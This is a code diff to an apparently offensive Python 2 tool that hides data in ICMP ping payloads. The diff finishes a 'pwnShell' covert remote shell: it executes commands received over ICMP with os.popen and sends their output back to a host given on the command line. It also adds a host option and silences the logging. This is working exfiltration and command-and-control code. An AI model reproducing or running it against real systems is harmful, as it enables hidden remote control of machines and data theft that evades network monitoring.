@@ -50,13 +50,14 @@ def lastBytesCommunication(interface):
 
     return dec
 
-def exfiltrateLastBytes(data, ip, src):
+def exfiltrateLastBytes(data, ip, src, verbose):
 
-    print "[*] Destination of data: {}".format(ip)
-    if src:
-        print "[*] Sending encoded file: {}".format(src)
-    else:
-        print "[*] Sending encoded message: \"{}\"".format(data)
+    if verbose:
+        print "[*] Destination of data: {}".format(ip)
+        if src:
+            print "[*] Sending encoded file: {}".format(src)
+        else:
+            print "[*] Sending encoded message: \"{}\"".format(data)
 
     # add final signal to stop receiving data
     string = base64.b64encode(data).encode("hex") + "0a"
@@ -73,7 +74,8 @@ def exfiltrateLastBytes(data, ip, src):
     for i in blocks:
         os.system("ping -c1 -p {} {} > /dev/null".format(i, ip))
 
-    print "[*] Message sent to {}".format(ip)
+    if verbose:
+        print "[*] Message sent to {}".format(ip)
 
 def server(interface, mode):
 
@@ -88,12 +90,11 @@ def server(interface, mode):
         else:
             return
 
-        print "[*] Received data: \"{}\"".format(data)
         received.append(data)
 
     return "\n".join(received) + "\n"
 
-def pwnShell(interface, mode, receiver):
+def pwnShell(interface, mode, ip, receiver):
 
     while True:
         if receiver:
@@ -101,27 +102,21 @@ def pwnShell(interface, mode, receiver):
             while data == "":
                 data = server(interface, mode)
             cmd = os.popen(data).read()
-            exfiltrateLastBytes(cmd, "127.0.0.1", "")
-
-
-    """
-
-    client connects to server
-
-    server sends command as client, client replies sending back data
-
-    # both need to send and receive (communication both ways)
-
-    """
-
-    pass
-
+            exfiltrateLastBytes(cmd, ip, "", 0)
+        else:
+            cmd = raw_input("> ")
+            exfiltrateLastBytes(cmd, ip, "", 0)
+            data = ""
+            while data == "":
+                data = server(interface, mode)
+            print data.strip()
 
 if __name__ == "__main__":
 
     parser = argparse.ArgumentParser(description='Client that sends data disguised in ICMP packets. Keep in mind settings need to be the same for the server')
     parser.add_argument('-o', '--out', type=str, help='write received data on a file')
     parser.add_argument('-m', '--mode', type=int, default=1, help='the mode of exfiltration: 1 is lousy (inside packets), 2 time-based')
+    parser.add_argument('-H', '--host', type=str, help='the destination of the packets (ex: 127.0.0.1)')
 
     requiredNamed = parser.add_argument_group('required named arguments')
     parser.add_argument('-i', '--interface', type=str, help='interface to listen on', required=True)
@@ -134,7 +129,7 @@ if __name__ == "__main__":
     shell = True
 
     if shell:
-        pwnShell(args.interface, args.mode, 1)
+        pwnShell(args.interface, args.mode, args.host, 1)
 
     else:
         out = server(args.interface, args.mode, shell)
